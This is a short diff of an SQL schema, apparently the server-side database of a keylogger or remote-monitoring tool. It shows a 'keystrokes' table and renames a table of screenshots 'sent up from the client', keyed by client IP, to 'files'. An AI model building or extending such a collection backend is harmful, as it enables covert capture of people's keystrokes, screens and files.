@@ -26,9 +26,10 @@ CREATE TABLE `keystrokes` (
 ) WITHOUT ROWID;
 
 -- Store screenshots sent up from the client
-CREATE TABLE `screencaptures` (
+CREATE TABLE `files` (
 	`ip`        TEXT,
         `filename`  TEXT,
 	`time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
         PRIMARY KEY(`ip`, `filename`)
 ) WITHOUT ROWID;
+
